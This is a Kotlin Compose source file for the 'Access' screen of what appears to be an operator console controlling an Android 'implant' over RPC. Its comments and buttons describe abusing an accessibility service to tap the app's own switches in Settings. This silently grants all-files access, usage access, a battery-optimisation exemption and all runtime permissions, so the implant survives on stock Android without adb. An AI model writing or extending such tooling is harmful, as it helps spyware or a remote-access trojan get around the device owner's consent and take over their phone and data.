package com.shadow.operator.ui.cap

import android.widget.Toast
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import kotlinx.coroutines.launch

/**
 * Access panel: what is granted, and the native way to grant what is missing.
 *
 * Special-access permissions (all-files, usage access, battery exemption) have no
 * silent API for a normal app, so the flow is two taps we drive for the operator:
 *   1. grant_screen <kind>  -> opens the right Settings screen
 *   2. toggle_grant         -> our accessibility service clicks OUR row
 * That keeps the implant working on stock Android with no Shizuku and no adb.
 */
@Composable
fun AccessScreen(rpc: RpcClient, onNavigateBack: () -> Unit) {
    val scope = rememberCoroutineScope()
    val ctx = LocalContext.current
    val perms = remember { CapLoad("perms") }
    var log by remember { mutableStateOf<String?>(null) }
    var busy by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) { perms.run(rpc) }

    fun send(cmd: String, payload: String, note: String) {
        scope.launch {
            busy = true
            val out = rpc.execute(cmd, payload, 180000)
            log = "$note → $out"
            busy = false
            Toast.makeText(ctx, out.take(120), Toast.LENGTH_LONG).show()
        }
    }

    val granted = remember(perms.raw) {
        perms.raw.lineSequence()
            .map { it.trim() }
            .filter { it.contains("permission.") }
            .map { line ->
                val name = line.substringAfterLast("permission.").substringBefore(":")
                val on = line.contains("granted=true")
                name to on
            }
            .toList()
    }

    val special = listOf(
        Triple("All files access", "allfiles", "needed before Files can list files (Android 11+)"),
        Triple("Usage access", "usage", "needed for fgapp (foreground app)"),
        Triple("Ignore battery optimisation", "battery", "survive ColorOS background kill"),
        Triple("Accessibility", "a11y", "already on if commands run at all"),
    )

    CapabilityScreen(
        title = "Access",
        subtitle = if (perms.error != null) "error"
        else "${granted.count { it.second }} of ${granted.size} runtime perms granted · ${perms.tookMs} ms",
        onBack = onNavigateBack,
        loading = perms.loading,
        onRefresh = { scope.launch { perms.run(rpc) } },
        accent = CapAmber
    ) {
        perms.error?.let { CapMessage(it.take(400), CapRed); return@CapabilityScreen }

        LazyColumn(
            Modifier.fillMaxSize(),
            contentPadding = PaddingValues(bottom = 20.dp)
        ) {
            item {
                Text(
                    "SPECIAL ACCESS  ·  native grant path",
                    color = CapFaint, fontSize = 10.sp, fontFamily = FontFamily.Monospace,
                    modifier = Modifier.padding(start = 16.dp, top = 12.dp, bottom = 4.dp)
                )
            }
            items(special) { (label, kind, hint) ->
                Column(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 8.dp)) {
                    Text(label, color = CapText, fontSize = 14.sp,
                        fontWeight = FontWeight.Medium, fontFamily = FontFamily.Monospace)
                    Text(hint, color = CapDim, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        TextButton(
                            enabled = !busy,
                            onClick = { send("grant_screen", """{"kind":"$kind"}""", "opened $label") }
                        ) {
                            Text("Open screen", color = CapBlue, fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace)
                        }
                        TextButton(
                            enabled = !busy,
                            onClick = { send("toggle_grant", "{}", "toggled $label") }
                        ) {
                            Text("Toggle our switch", color = CapGreen, fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace)
                        }
                    }
                }
                HorizontalDivider(color = CapBorder)
            }

            item {
                Column(Modifier.fillMaxWidth().padding(16.dp)) {
                    Text(
                        "RUNTIME PERMISSIONS",
                        color = CapFaint, fontSize = 10.sp, fontFamily = FontFamily.Monospace
                    )
                    Spacer(Modifier.height(6.dp))
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        TextButton(
                            enabled = !busy,
                            onClick = { send("autogrant", "{}", "auto-grant started") }
                        ) {
                            Text("Auto-grant all (a11y clicks)", color = CapGreen, fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace)
                        }
                    }
                }
            }

            item {
                log?.let {
                    Text(
                        it,
                        color = CapAmber, fontSize = 11.sp, fontFamily = FontFamily.Monospace,
                        modifier = Modifier.fillMaxWidth().clickable { }.padding(horizontal = 16.dp, vertical = 4.dp)
                    )
                }
            }

            items(granted) { (name, on) ->
                Row(
                    Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 7.dp),
                    verticalAlignment = androidx.compose.ui.Alignment.CenterVertically
                ) {
                    Text(
                        if (on) "●" else "○",
                        color = if (on) CapGreen else CapRed,
                        fontSize = 12.sp,
                        modifier = Modifier.padding(end = 10.dp)
                    )
                    Text(
                        name,
                        color = if (on) CapText else CapDim,
                        fontSize = 13.sp, fontFamily = FontFamily.Monospace,
                        modifier = Modifier.weight(1f)
                    )
                    Text(
                        if (on) "granted" else "missing",
                        color = if (on) CapGreen else CapRed,
                        fontSize = 11.sp, fontFamily = FontFamily.Monospace
                    )
                }
            }
        }
    }
}
